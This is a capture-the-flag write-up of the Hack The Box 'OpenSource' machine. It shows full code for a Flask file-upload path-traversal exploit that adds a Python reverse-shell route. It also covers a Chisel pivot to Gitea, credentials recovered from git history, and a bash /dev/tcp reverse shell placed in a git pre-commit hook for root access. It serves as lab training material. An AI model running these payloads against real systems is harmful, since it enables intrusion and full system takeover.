# This is the Writeup of OpenSource machine on Hack The Box

So the first thing that we have to do is of course nmap scan. The output is shown below:
```# Nmap 7.93 scan initiated Fri May 26 15:34:39 2023 as: nmap -sV -Pn -sC -v -p- -oN scan 10.10.11.164
Nmap scan report for 10.10.11.164
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e59057ca958c923900f7523823d055f (RSA)
|   256 48a853e7e008aa1d968652bb8856a0b7 (ECDSA)
|_  256 021f979e3c8e7a1c7caf9d5a254bb8c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 26 May 2023 19:35:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 26 May 2023 19:35:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see, there are 3 ports open: 22, 80 and 3000. 22 and 80 are standard ports for SSH and HTTP, but on port 3000 there is a service running, that we don't really know yet. So, the natural thing to do now, would be to scan the website for hidden directories or subdomains. We know there are no subdomains as the IP address of the machine (10.10.11.164) does not resolve to any domain name, thuss it doesn't have any subdomains. After using gobuster to scan site for hidden directories, it doesn't show anything useful. After playing with the site for a while, we are able to download the source code and find a place to upload our files. The source code of [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) looks like this:
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```
And the source code of [utils.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/utils.py) looks like this:
```python
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```
In [utils.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/utils.py), we can see that function for getting unique filename is not implemented yet. This means, that if we upload something called Test.txt, it will still be called Test.txt after being uploaded. This kind of lazy coding is something that we will be able to exploit! Upon further inspecting of [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file, we can see that the function used for crafting the path, where uploaded file should be stored, is using the os.path.join(). It turns out, that os.path.join() has a **FATAL** vulnerability that will come in handy this time!
It is using our filename for crafting the path to the file, but if the filename starts with "/", it makes the filepath start from the root filesystem:
```python 
>>> import os
>>> os.path.join("test", "file.txt")
'test/file.txt'
>>> os.path.join("test","test2","/file.txt")
'/file.txt'
```
It basically means, that if we name our file "/etc/passwd", it wouldn't end up in the "/app/public/uploads/etc/passwd" directory, but would end up overwriting the original "/etc/passwd" file. **Bingo!**


In source code that we just downloaded we can see that the directory with [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) is in /app/app/ directory.If we modify [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py), and name it "/app/app/views.py" it would overwrite the original [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file and we would be able to execute our own python code. I modified the [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file so it contains another route at "/revshell/\<ip\>"
that will execute reverse shell after visiting this endpoint with my browser.
    
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/revshell/<ip>')
def revshell(ip):
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((f"{ip}",1337));os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    import pty
    pty.spawn("sh")
```
Now I set up a netcat listener with `nc -lvnp 1337` and I visited the "/revshell/\<ip\>" endpoint with my actual ip. **Hoorah!** We just got ourselves access to a docker container!
Well, now comes the tricky part. We knew before that there was some kind of service running on port 3000 - probably Gitea, as this is its default HTTP listening port. To get access to Gitea, we will need to do some pivoting. When doing this CTF, I stumbled upon **_Chisel_**. This is the tool that establishes fast TCP/UDP tunnel, transported over HTTP and secured via SSH. You can visit **Chisel** github page [here](https://github.com/jpillora/chisel). 
Now, I uploaded the **Chisel** to the docker container and set up a **Chisel** server on my localhost using command: `chipsel server --reverse -p 8001`. Then, I used **Chisel** on discord as a client, using this command: `chipsel client \<ip\>:\<port\> R:socks`. Now, the only thing that I needed was to set up my browser proxy to proxy all the network traffic through port 1080 (default port used by Chisel). I did it with FoxyProxy add-on, by using settings like: Proxy Type = SOCKS5, Proxy IP = 127.0.0.1, Port = 1080. **Voila!** Now we have access to Gitea!

We know that private IPv4 of compromised docker container is 172.17.0.1. If we search for "http://172.17.0.1:3000" in browser, we will be greeted with Gitea login screen. Huh... But how do we log in?

If we check the folder, where we downloaded the source code of vulnerable app, we can see that it contains also .git directory. After playing a while with git commands, I was able to find the _dev_ branch and switched to it by using `git checkout dev`. Now after using `git log` and inspecting each log with `git show \<id of commit\>`, I found some hardcoded credentials - dev01:Soulless_Developer#2022

After using these credential to log into Gitea, we are able to find private ssh key of dev01. Now the only thing to do is to copy this key and to use our `ssh` command with `-i` flag to log in using the copied key stored in a file id_rsa:
`sudo ssh -i id_rsa dev01@10.10.11.164`

After this long journey, we are able to finally submit the **_user.txt_** flag.

As in most of the CTF's, I check for SUID bits, uploaded linpeas.sh, yada yada yada... But it didn't help much. After inspecting some background processes using **pspy64** we can notice that there is a binary running every minute called "_/usr/local/bin/git-sync_". This is its source code:
```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```
This script executes every minute and it basically checks for changes in /home/dev01/. If there are some changes, it executes a bunch of git commands such as: `git add`, `git commit`, etc.
Knowing this, we can make a malicious git hook that will execute our commands every time, there is a `git commit` command executed. The name of my hook was "**pre-commit**" and it contained this code:

```bash
#!/bin/bash
bash -i >& /dev/tcp/\<my_ip\>/\<my_port\> 0>&1
```
Then I set up a netcat listener on my localhost using command `nc -lvnp 6969` and modified the home directory of dev01 user by adding some non-empty files with command `echo "I don't know what I'm doing" > test.txt`. After couple of seconds, I got a reverse shell with root privileges and was able to retrieve the **_root.txt_** flag.

This box was actually really fun and I needed to access tutorials to deal with some of the parts, but at the same time I learned a lot of new things. I am really glad that I bought HackTheBox Vip membership and I can't wait to make more writeups in the future! See you soon choombas! :)
    

